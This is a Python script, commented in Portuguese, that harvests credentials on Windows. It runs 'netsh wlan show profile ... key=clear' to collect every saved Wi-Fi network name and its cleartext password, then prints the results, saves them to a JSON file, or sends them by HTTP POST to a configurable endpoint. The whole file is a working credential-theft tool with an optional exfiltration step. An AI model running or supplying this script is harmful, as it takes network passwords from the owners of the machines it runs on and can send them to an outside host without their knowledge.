import re
import json
import requests
import subprocess

# ENDPOINT para onde o resultado deve ser enviado (opcional, mas se colocar um endpoint, mude a variável da linha 11 para 'True')
endpoint = '<ENDPOINT>'

# True para salvar no diretório onde o script foi executado e False para não salvar
salvar = False

# True para enviar para o ENDPOINT e False para não enviar
enviar = False

# True para exibir o resultado e False para não exibir
exibir_resultado = True

command = 'netsh wlan show profile'

# Muda a codificação para conseguir decodificar o output
subprocess.run('chcp 65001', shell=True, capture_output=True)

def coleta_profiles():
    """ Coleta os perfis salvos no computador """
    profile_list = list()
    profiles = subprocess.run(command, shell=True, capture_output=True).stdout.decode()
    for profile in re.findall(r':\s\w.*', profiles):
        profile_list.append(profile[2:].strip())
    return profile_list
    
def coleta_senhas(profile_list):
    """ Faz a iteração dos perfis para coletar as senhas """
    resultado = dict()
    protegido = dict()
    livre = list()
    for ssid in profile_list:
        senha = subprocess.run(f'{command} "{ssid}" key=clear', shell=True, capture_output=True).stdout.decode()
        try:
            pwd = re.search('da Chave.*', senha).group().strip()
            pwd = pwd[pwd.index(':')+2:]
            protegido[ssid] = pwd
        except:
            livre.append(ssid)
    resultado["quantidade"] = {"livre": len(livre), "protegido": len(protegido), "total": len(protegido) + len(livre)}
    resultado["protegido"] = protegido
    resultado["livre"] = livre
    return resultado

def salva_resultado(resultado):
    """ Salva as informações em formato json """
    with open('Senhas_Wi-fi.json', 'w') as wifi_pwds:
        json.dump(resultado, wifi_pwds, indent=4)

def envia_resultado(resultado):
    """ Envia o resultado para algum endpoint indicado pelo usuário """
    data = {"resultado": resultado}
    response = requests.post(endpoint, json=data)
    return response

if __name__ == '__main__':
    print("\n[*] Coletando perfis...")
    profile_list = coleta_profiles()
    print("[+] Perfis coletados...")
    print("[*] Coletando senhas...")
    resultado = coleta_senhas(profile_list)
    print("[+] Senhas coletadas...")
    if exibir_resultado:
        print("\n"+"#"*55)
        print(json.dumps(resultado, indent=4))
        print("#"*55)
    if salvar:
        print("\n[*] Salvando...")
        salva_resultado(resultado)
        print("[+] Salvo...")
    if enviar and endpoint:
        print("\n[*] Enviando resultado...")
        response = envia_resultado(resultado)
        if response:
            print("[*] Status code: {}".format(response.status_code))
            if response.status_code == 200:
                print("[+] Enviado...")
            else:
                print("[-] Ocorreu algum erro: {}".format(response.text))
    print("\n[*] Finalizado...\n")